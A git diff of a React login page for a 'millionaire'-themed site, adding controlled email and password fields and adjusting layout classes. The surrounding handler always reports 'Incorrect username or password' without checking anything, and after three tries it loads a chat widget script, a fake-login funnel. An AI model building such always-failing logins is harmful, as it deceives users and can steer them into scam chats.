@@ -5,12 +5,16 @@ import coinsImg from "../assets/millionaire-login.webp";
 const Login = ({ onBack }) => {
   const [loginAttempts, setLoginAttempts] = useState(0);
   const [errorMessage, setErrorMessage] = useState("");
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
 
   const handleLogin = (e) => {
     e.preventDefault();
     const newAttempts = loginAttempts + 1;
     setLoginAttempts(newAttempts);
     setErrorMessage("Incorrect username or password");
+    setEmail("");
+    setPassword("");
     
     if (newAttempts >= 3) {
       if (!document.getElementById("tidio-script")) {
@@ -24,9 +28,9 @@ const Login = ({ onBack }) => {
   };
 
   return (
-    <div className="w-full h-screen flex flex-col md:flex-row font-sans">
+    <div className="w-full min-h-[100dvh] flex flex-col md:flex-row font-sans">
       {/* Left Panel - Marketing (Hidden on very small screens, 50% on lg+) */}
-      <div className="hidden lg:flex lg:w-1/2 h-full bg-[#1c3249] flex-col relative px-12 py-12 border-r border-[#121212]">
+      <div className="hidden lg:flex lg:w-1/2 flex-1 bg-[#1c3249] flex-col relative px-12 py-12 border-r border-[#121212]">
         {/* Top Logo */}
         <div className="absolute top-8 left-10 cursor-pointer" onClick={onBack}>
           <img
@@ -71,7 +75,7 @@ const Login = ({ onBack }) => {
       </div>
 
       {/* Right Panel - Authentication */}
-      <div className="w-full lg:w-1/2 h-full bg-[#0f0f0f] flex flex-col relative overflow-y-auto">
+      <div className="w-full lg:w-1/2 flex-1 bg-[#0f0f0f] flex flex-col relative overflow-y-auto">
         {/* Mobile Logo (visible only on mobile and tablet) */}
         <div className="lg:hidden w-full flex justify-center py-8">
           <img
@@ -106,6 +110,8 @@ const Login = ({ onBack }) => {
                   id="email"
                   className="w-full bg-[#242424] text-white text-[16px] font-medium px-4 py-[14px] rounded-[16px] border border-[#3a3a3a] focus:border-white focus:outline-none transition-colors placeholder:text-[#e0e0e0] placeholder:font-medium"
                   placeholder="Email"
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
                 />
               </div>
 
@@ -116,6 +122,8 @@ const Login = ({ onBack }) => {
                   id="password"
                   className="w-full bg-[#242424] text-white text-[16px] font-medium px-4 py-[14px] rounded-[16px] border border-[#3a3a3a] focus:border-white focus:outline-none transition-colors placeholder:text-[#e0e0e0] placeholder:font-medium pr-14"
                   placeholder="Password"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
                 />
                 <button
                   type="button"
